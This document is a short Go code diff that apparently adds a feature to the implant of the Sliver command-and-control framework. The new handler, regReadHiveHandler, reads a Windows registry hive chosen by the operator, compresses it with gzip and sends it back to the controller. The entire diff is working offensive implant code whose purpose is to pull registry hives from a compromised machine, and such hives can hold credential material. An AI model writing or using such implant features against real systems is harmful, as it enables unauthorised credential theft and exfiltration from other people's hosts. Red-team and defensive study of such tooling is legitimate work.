@@ -73,6 +73,7 @@ var (
 		sliverpb.MsgExecuteWindowsReq:              executeWindowsHandler,
 		sliverpb.MsgGetPrivsReq:                    getPrivsHandler,
 		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
+		sliverpb.MsgRegistryReadHiveReq:            regReadHiveHandler,
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:            ifconfigHandler,
@@ -751,6 +752,28 @@ func regValuesListHandler(data []byte, resp RPCResponse) {
 		regListResp.ValueNames = regValues
 	}
 	data, err = proto.Marshal(regListResp)
+	resp(data, err)
+}
+
+func regReadHiveHandler(data []byte, resp RPCResponse) {
+	hiveReq := &sliverpb.RegistryReadHiveReq{}
+	err := proto.Unmarshal(data, hiveReq)
+	if err != nil {
+		return
+	}
+	hiveResp := &sliverpb.RegistryReadHive{
+		Response: &commonpb.Response{},
+	}
+	hiveData, err := registry.ReadHive(hiveReq.RootHive, hiveReq.RequestedHive)
+	if err != nil {
+		hiveResp.Response.Err = err.Error()
+	}
+	// We might not have a fatal error, so whatever the result (nil or not), assign .Data to it
+	gzipData := bytes.NewBuffer([]byte{})
+	gzipWrite(gzipData, hiveData)
+	hiveResp.Data = gzipData.Bytes()
+	hiveResp.Encoder = "gzip"
+	data, err = proto.Marshal(hiveResp)
 	resp(data, err)
 }
 
